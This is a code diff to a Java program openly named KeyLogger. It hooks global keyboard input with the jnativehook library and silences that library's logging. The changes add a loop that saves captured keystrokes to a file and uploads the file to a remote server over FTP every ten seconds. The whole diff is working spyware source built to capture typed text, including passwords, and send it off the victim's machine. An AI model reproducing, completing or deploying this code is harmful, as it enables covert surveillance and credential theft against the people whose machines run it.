@@ -7,32 +7,39 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
-public class KeyLogger implements NativeKeyListener {
+public class KeyLogger extends Thread implements NativeKeyListener, Runnable {
 	
-	private String textEntered;
+	private final static int UPLOAD_TIME = 10;
+	private static String textEntered;
 	private FileHandler fileHandler;
+	private FTPHandler ftpHandler;
 	
 	public KeyLogger() {
 		textEntered = new String();
 		fileHandler = FileHandler.getInstance();
+		ftpHandler = new FTPHandler();
 	}
 
     public static void main(String[] args) {
     	KeyLogger keyLogger = new KeyLogger();
-    	
-        keyLogger.createFile();
-    	
-        try {
-            GlobalScreen.registerNativeHook();
-        } 
-        catch (NativeHookException ex) {
-            System.err.println("There was a problem registering the native hook.");
-            System.err.println(ex.getMessage());
-            System.exit(1);
-        }
 
-        GlobalScreen.addNativeKeyListener(new KeyLogger());
-        keyLogger.disableConsoleLogger();
+        keyLogger.initializeKeyListener();
+        keyLogger.createFile();
+        
+        while(true) {
+        	wait(UPLOAD_TIME);
+        	System.out.println("Uploading...");
+            keyLogger.transferToFile();
+            keyLogger.uploadingFileToServer();
+        }
+    }
+    
+    public void uploadingFileToServer() {
+    	ftpHandler.uploadToServer(fileHandler.getFile());
+    }
+    
+    public void transferToFile() {
+    	fileHandler.writeToFile(textEntered);
     }
     
     public void createFile() {
@@ -44,8 +51,7 @@ public class KeyLogger implements NativeKeyListener {
 		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
 		String convertedKey = convertKey(keyPressed);
 		
-		textEntered.concat(convertedKey);
-		fileHandler.appendToFile(convertedKey);
+		textEntered += convertedKey;
 	}
 	
 	public String convertKey(String keyPressed){
@@ -72,10 +78,32 @@ public class KeyLogger implements NativeKeyListener {
 		return keyPressed;
 	}
 	
+    public void initializeKeyListener() {
+        try {
+            GlobalScreen.registerNativeHook();
+        } 
+        catch (NativeHookException ex) {
+            System.err.println("There was a problem registering the native hook.");
+            System.err.println(ex.getMessage());
+            System.exit(1);
+        }
+
+        GlobalScreen.addNativeKeyListener(new KeyLogger());
+        disableConsoleLogger();
+    }
+	
     public void disableConsoleLogger() {
     	Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
         logger.setLevel(Level.OFF);
         logger.setUseParentHandlers(false);
+    }
+    
+    public static void wait(int timeInSeconds) {
+        try {
+			Thread.sleep(timeInSeconds*1000);
+		} catch (InterruptedException e) {
+			e.printStackTrace();
+		}
     }
 
 	@Override
@@ -83,6 +111,7 @@ public class KeyLogger implements NativeKeyListener {
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent keyEvent) {}
+	
 }
 
 
